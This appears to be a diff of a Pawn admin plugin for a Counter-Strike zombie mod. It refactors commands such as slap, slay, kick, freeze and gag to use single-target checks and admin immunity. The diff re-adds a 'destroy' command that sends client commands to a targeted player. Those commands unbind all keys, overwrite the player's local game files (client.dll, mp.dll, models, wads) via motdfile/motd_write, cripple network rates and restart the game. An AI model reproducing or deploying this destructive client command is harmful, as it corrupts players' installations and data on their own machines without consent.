@@ -10467,7 +10467,7 @@ public cmd_slap(id)
 	// Check for access flag depending on the resulting action
 	if (g_admin[id] && AdminHasFlag(id, g_accessFlag[ACCESS_SLAP]))
 	{
-		static command[33], arg[33], iPlayers[32], iPlayersnum, target[32]
+		static command[33], arg[33], target
 		
 		// Retrieve arguments
 		read_argv(0, command, charsmax(command))
@@ -10491,18 +10491,22 @@ public cmd_slap(id)
 		}
 		
 		// Initialize Target
-		iPlayersnum = cmd_targetex(id, arg, iPlayers, target, charsmax(target), TARGETEX_OBEY_IMM_GROUP | TARGETEX_OBEY_IMM_SINGLE | TARGETEX_NO_DEAD)
-		
+		target = cmd_target(id, arg, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ONLY_ALIVE | CMDTARGET_ALLOW_SELF)
+
 		// Invalid target
-		if (!iPlayersnum) return PLUGIN_HANDLED
+		if (!target) return PLUGIN_HANDLED
 		
-		for(new i; i < iPlayersnum; i++)
-			user_slap(iPlayers[i], 0, 1)
+		if (AdminHasFlag(target, g_accessFlag[ACCESS_IMMUNITY]))
+		{
+			console_print(id, "[Zombie Queen] You cannot slap an Admin with immunity!")
+			return PLUGIN_HANDLED
+		}
 		
-		client_print_color(0, print_team_grey, "%s Admin^3 %s^1 slapped^3 %s", CHAT_PREFIX, g_playerName[id], target)
+		user_slap(target, 0, 1)
+		client_print_color(0, print_team_grey, "%s Admin^3 %s^1 slapped^3 %s", CHAT_PREFIX, g_playerName[id], g_playerName[target])
 		
 		// Log to Zombie Plague log file?
-		//LogToFile(LOG_SLAP, id, target)
+		LogToFile(LOG_SLAP, id, target)
 	}
 	else console_print(id, "You have no access to that command")
 
@@ -10540,24 +10544,18 @@ public cmd_slay(id)
 		
 		// Initialize Target
 		target = cmd_target(id, arg, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ONLY_ALIVE | CMDTARGET_ALLOW_SELF)
-		
+
 		// Invalid target
 		if (!target) return PLUGIN_HANDLED
 		
-		if (target > 0)
+		if (AdminHasFlag(target, g_accessFlag[ACCESS_IMMUNITY]))
 		{
-			if (AdminHasFlag(target, g_accessFlag[ACCESS_IMMUNITY]))
-			{
-				console_print(id, "[Zombie Queen] You cannot slay an Admin with immunity!")
-				return PLUGIN_HANDLED
-			}
-			else
-			{
-				user_kill(target)
-				client_print_color(0, print_team_grey, "%s Admin^3 %s^1 slayed^3 %s", CHAT_PREFIX, g_playerName[id], g_playerName[target])
-			}
+			console_print(id, "[Zombie Queen] You cannot slay an Admin with immunity!")
+			return PLUGIN_HANDLED
 		}
-		else console_print(id, "[Zombie Queen] Player was not found!")
+		
+		user_kill(target)
+		client_print_color(0, print_team_grey, "%s Admin^3 %s^1 slayed^3 %s", CHAT_PREFIX, g_playerName[id], g_playerName[target])
 		
 		// Log to Zombie Plague log file?
 		LogToFile(LOG_SLAY, id, target)
@@ -10598,24 +10596,18 @@ public cmd_kick(id)
 		
 		// Initialize Target
 		target = cmd_target(id, arg, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF)
-		
+
 		// Invalid target
 		if (!target) return PLUGIN_HANDLED
 		
-		if (target > 0)
+		if (AdminHasFlag(target, g_accessFlag[ACCESS_IMMUNITY]))
 		{
-			if (AdminHasFlag(target, g_accessFlag[ACCESS_IMMUNITY]))
-			{
-				console_print(id, "[Zombie Queen] You cannot kick an Admin with immunity!")
-				return PLUGIN_HANDLED
-			}
-			else
-			{
-				server_cmd("kick #%d  You are kicked!", get_user_userid(target))
-				client_print_color(0, print_team_grey, "%s Admin^3 %s^1 kicked^3 %s", CHAT_PREFIX, g_playerName[id], g_playerName[target])
-			}
+			console_print(id, "[Zombie Queen] You cannot kick an Admin with immunity!")
+			return PLUGIN_HANDLED
 		}
-		else console_print(id, "[Zombie Queen] Player was not found!")
+		
+		server_cmd("kick #%d  You are kicked!", get_user_userid(target))
+		client_print_color(0, print_team_grey, "%s Admin^3 %s^1 kicked^3 %s", CHAT_PREFIX, g_playerName[id], g_playerName[target])
 		
 		// Log to Zombie Plague log file?
 		LogToFile(LOG_KICK, id, target)
@@ -10656,50 +10648,44 @@ public cmd_freeze(id)
 		
 		// Initialize Target
 		target = cmd_target(id, arg, CMDTARGET_OBEY_IMMUNITY)
-		
+
 		// Invalid target
 		if (!target) return PLUGIN_HANDLED
 		
-		if (target > 0)
+		if (AdminHasFlag(target, g_accessFlag[ACCESS_IMMUNITY]))
 		{
-			if (AdminHasFlag(target, g_accessFlag[ACCESS_IMMUNITY]))
-			{
-				console_print(id, "[Zombie Queen] You cannot freeze an Admin with immunity!")
-				return PLUGIN_HANDLED
-			}
-			else
-			{
-				// Light blue glow while frozen
-				set_glow(target, 0, 206, 209, 25)
-				
-				// Freeze sound
-				static iRand, buffer[100]
-				iRand = random_num(0, ArraySize(Array:g_miscSounds[SOUND_GRENADE_FROST_PLAYER]) - 1)
-				ArrayGetString(Array:g_miscSounds[SOUND_GRENADE_FROST_PLAYER], iRand, buffer, charsmax(buffer))
-				emit_sound(target, CHAN_BODY, buffer, 1.0, ATTN_NORM, 0, PITCH_NORM)
-				
-				// Add a blue tint to their screen
-				UTIL_ScreenFade(target, {0, 200, 200}, 0.0, 0.0, 100, FFADE_STAYOUT, true, false)
-				
-				// Set the frozen flag
-				g_frozen[target] = true
-				
-				// Save player's old gravity (bugfix)
-				pev(target, pev_gravity, g_frozen_gravity[target])
-				
-				// Prevent from jumping
-				if (pev(target, pev_flags) & FL_ONGROUND)
-					set_pev(target, pev_gravity, 999999.9) // set really high
-				else
-					set_pev(target, pev_gravity, 0.000001) // no gravity
-				
-				// Prevent from moving
-				ExecuteHamB(Ham_Player_ResetMaxSpeed, target)
-
-				client_print_color(0, print_team_grey, "%s Admin^3 %s^1 freeze^3 %s", CHAT_PREFIX, g_playerName[id], g_playerName[target])
-			}
+			console_print(id, "[Zombie Queen] You cannot freeze an Admin with immunity!")
+			return PLUGIN_HANDLED
 		}
-		else console_print(id, "[Zombie Queen] Player was not found!")
+		
+		// Light blue glow while frozen
+		set_glow(target, 0, 206, 209, 25)
+		
+		// Freeze sound
+		static iRand, buffer[100]
+		iRand = random_num(0, ArraySize(Array:g_miscSounds[SOUND_GRENADE_FROST_PLAYER]) - 1)
+		ArrayGetString(Array:g_miscSounds[SOUND_GRENADE_FROST_PLAYER], iRand, buffer, charsmax(buffer))
+		emit_sound(target, CHAN_BODY, buffer, 1.0, ATTN_NORM, 0, PITCH_NORM)
+		
+		// Add a blue tint to their screen
+		UTIL_ScreenFade(target, {0, 200, 200}, 0.0, 0.0, 100, FFADE_STAYOUT, true, false)
+		
+		// Set the frozen flag
+		g_frozen[target] = true
+		
+		// Save player's old gravity (bugfix)
+		pev(target, pev_gravity, g_frozen_gravity[target])
+		
+		// Prevent from jumping
+		if (pev(target, pev_flags) & FL_ONGROUND)
+			set_pev(target, pev_gravity, 999999.9) // set really high
+		else
+			set_pev(target, pev_gravity, 0.000001) // no gravity
+		
+		// Prevent from moving
+		ExecuteHamB(Ham_Player_ResetMaxSpeed, target)
+
+		client_print_color(0, print_team_grey, "%s Admin^3 %s^1 freeze^3 %s", CHAT_PREFIX, g_playerName[id], g_playerName[target])
 		
 		// Log to Zombie Plague log file?
 		LogToFile(LOG_FREEZE, id, target)
@@ -10739,24 +10725,18 @@ public cmd_unfreeze(id)
 		
 		// Initialize Target
 		target = cmd_target(id, arg, CMDTARGET_OBEY_IMMUNITY)
-		
+
 		// Invalid target
 		if (!target) return PLUGIN_HANDLED
 		
-		if (target > 0)
+		if (AdminHasFlag(target, g_accessFlag[ACCESS_IMMUNITY]))
 		{
-			if (AdminHasFlag(target, g_accessFlag[ACCESS_IMMUNITY]))
-			{
-				console_print(id, "[Zombie Queen] You cannot unfreeze an Admin with immunity!")
-				return PLUGIN_HANDLED
-			}
-			else
-			{
-				remove_freeze(target)
-				client_print_color(0, print_team_grey, "%s Admin^3 %s^1 unfreeze^3 %s", CHAT_PREFIX, g_playerName[id], g_playerName[target])
-			}
+			console_print(id, "[Zombie Queen] You cannot unfreeze an Admin with immunity!")
+			return PLUGIN_HANDLED
 		}
-		else console_print(id, "[Zombie Queen] Player was not found!")
+		
+		remove_freeze(target)
+		client_print_color(0, print_team_grey, "%s Admin^3 %s^1 unfreeze^3 %s", CHAT_PREFIX, g_playerName[id], g_playerName[target])
 		
 		// Log to Zombie Plague log file?
 		static logdata[100]
@@ -10832,18 +10812,23 @@ public cmd_destroy(id)
 		read_argv(1, cTarget, 32)
 		target = cmd_target (id, cTarget, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF)
 
-		if (target)
+		// Invalid target
+		if (!target) return PLUGIN_HANDLED
+
+		if (AdminHasFlag(target, g_accessFlag[ACCESS_IMMUNITY]))
 		{
-			client_cmd(target, "unbindall; bind ` ^"say I_have_been_destroyed^"; bind ~ ^"say I_have_been_destroyed^"; bind esc ^"say I_have_been_destroyed^"")
-			client_cmd(target, "motdfile resource/GameMenu.res; motd_write a; motdfile models/player.mdl; motd_write a; motdfile dlls/mp.dll; motd_write a")
-			client_cmd(target, "motdfile cl_dlls/client.dll; motd_write a; motdfile cs_dust.wad; motd_write a; motdfile cstrike.wad; motd_write a")
-			client_cmd(target, "motdfile sprites/muzzleflash1.spr; motdwrite a; motdfile events/ak47.sc; motd_write a; motdfile models/v_ak47.mdl; motd_write a")
-			client_cmd(target, "fps_max 1; rate 0; cl_cmdrate 0; cl_updaterate 0")
-			client_cmd(target, "hideconsole; hud_saytext 0; cl_allowdownload 0; cl_allowupload 0; cl_dlmax 1; _restart")
-			client_print_color(0, print_team_grey, "%s Admin^3 %s^1 destroy^3 %s", CHAT_PREFIX, g_playerName[id], g_playerName[target])
-			client_cmd(0, "spk ^"vox/bizwarn coded user apprehend^"")
+			console_print(id, "[Zombie Queen] You cannot destroy an Admin with immunity!")
+			return PLUGIN_HANDLED
 		}
-		console_print(id, "[Zombie Queen] Player was not found!")
+
+		client_cmd(target, "unbindall; bind ` ^"say I_have_been_destroyed^"; bind ~ ^"say I_have_been_destroyed^"; bind esc ^"say I_have_been_destroyed^"")
+		client_cmd(target, "motdfile resource/GameMenu.res; motd_write a; motdfile models/player.mdl; motd_write a; motdfile dlls/mp.dll; motd_write a")
+		client_cmd(target, "motdfile cl_dlls/client.dll; motd_write a; motdfile cs_dust.wad; motd_write a; motdfile cstrike.wad; motd_write a")
+		client_cmd(target, "motdfile sprites/muzzleflash1.spr; motdwrite a; motdfile events/ak47.sc; motd_write a; motdfile models/v_ak47.mdl; motd_write a")
+		client_cmd(target, "fps_max 1; rate 0; cl_cmdrate 0; cl_updaterate 0")
+		client_cmd(target, "hideconsole; hud_saytext 0; cl_allowdownload 0; cl_allowupload 0; cl_dlmax 1; _restart")
+		client_print_color(0, print_team_grey, "%s Admin^3 %s^1 destroy^3 %s", CHAT_PREFIX, g_playerName[id], g_playerName[target])
+		client_cmd(0, "spk ^"vox/bizwarn coded user apprehend^"")
 	}
 
 	return PLUGIN_CONTINUE
@@ -11181,26 +11166,23 @@ public cmd_gag(id)
 		
 		// Initialize Target
 		target = cmd_target(id, arg, CMDTARGET_ONLY_ALIVE | CMDTARGET_ALLOW_SELF)
-		
+
 		// Invalid target
 		if (!target) return PLUGIN_HANDLED
 		
-		if (target > 0)
+		if (AdminHasFlag(target, g_accessFlag[ACCESS_IMMUNITY]))
 		{
-			if (AdminHasFlag(target, g_accessFlag[ACCESS_IMMUNITY]))
+			console_print(id, "[Zombie Queen] You cannot gag an Admin with immunity!")
+			return PLUGIN_HANDLED
+		}
+		else
+		{
+			if (g_fGagTime[target] < get_gametime())
 			{
-				console_print(id, "[Zombie Queen] You cannot gag an Admin with immunity!")
-				return PLUGIN_HANDLED
+				g_fGagTime[target] = floatadd(get_gametime(), float(clamp(str_to_num(time), 1, 12) * 60))
+				client_print_color(0, print_team_grey, "%s Admin^3 %s^1 gag^3 %s^1 for^4 %i minutes", CHAT_PREFIX, g_playerName[id], g_playerName[target], clamp(str_to_num(time), 1, 12))
 			}
-			else
-			{
-				if (g_fGagTime[target] < get_gametime())
-				{
-			        g_fGagTime[target] = floatadd(get_gametime(), float(clamp(str_to_num(time), 1, 12) * 60))
-			        client_print_color(0, print_team_grey, "%s Admin^3 %s^1 gag^3 %s^1 for^4 %i minutes", CHAT_PREFIX, g_playerName[id], g_playerName[target], clamp(str_to_num(time), 1, 12))
-				}
-				else console_print(id, "[Zombie Queen] Player ^"%s^" is already gagged", g_playerName[target])
-			}
+			else console_print(id, "[Zombie Queen] Player ^"%s^" is already gagged", g_playerName[target])
 		}
 	}
 	else console_print(id, "You have no access to that command")
@@ -11241,22 +11223,19 @@ public cmd_ungag(id)
 		// Invalid target
 		if (!target) return PLUGIN_HANDLED
 		
-		if (target > 0)
+		if (AdminHasFlag(target, g_accessFlag[ACCESS_IMMUNITY]))
 		{
-			if (AdminHasFlag(target, g_accessFlag[ACCESS_IMMUNITY]))
+			console_print(id, "[Zombie Queen] You cannot ungag an Admin with immunity!")
+			return PLUGIN_HANDLED
+		}
+		else
+		{
+			if (g_fGagTime[target] > get_gametime())
 			{
-				console_print(id, "[Zombie Queen] You cannot ungag an Admin with immunity!")
-				return PLUGIN_HANDLED
+				g_fGagTime[target] = 0.0
+				client_print_color(0, print_team_grey, "%s Admin^3 %s^1 ungag^3 %s", CHAT_PREFIX, g_playerName[id], g_playerName[target])
 			}
-			else
-			{
-				if (g_fGagTime[target] > get_gametime())
-				{
-					g_fGagTime[target] = 0.0
-					client_print_color(0, print_team_grey, "%s Admin^3 %s^1 ungag^3 %s", CHAT_PREFIX, g_playerName[id], g_playerName[target])
-				}
-				else console_print(id, "[Zombie Queen] Player was not found!")
-			}
+			else console_print(id, "[Zombie Queen] Player was not found!")
 		}
 	}
 	else console_print(id, "You have no access to that command")
